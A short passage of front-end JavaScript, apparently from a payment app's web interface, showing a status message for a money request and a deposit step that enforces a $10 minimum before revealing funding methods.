    msg.classList.remove('hidden');
    return;
  }
  msg.textContent = 'Request sent to ' + fromUsername + ' for $' + amount;
  msg.className = 'msg success';
  msg.classList.remove('hidden');
});

// Deposit amount confirmation
document.getElementById('confirm-deposit-btn')?.addEventListener('click', () => {
  const amount = parseFloat(document.getElementById('deposit-amount-input').value);
  if (!amount || amount < 10) {
    alert('Minimum deposit is $10');
    return;
  }
  document.getElementById('deposit-amount-step').style.display = 'none';
  document.getElementById('funding-methods').style.display = 'block';
  document.getElementById('deposit-amount-display').textContent = '$' + amount.toFixed(2);
});
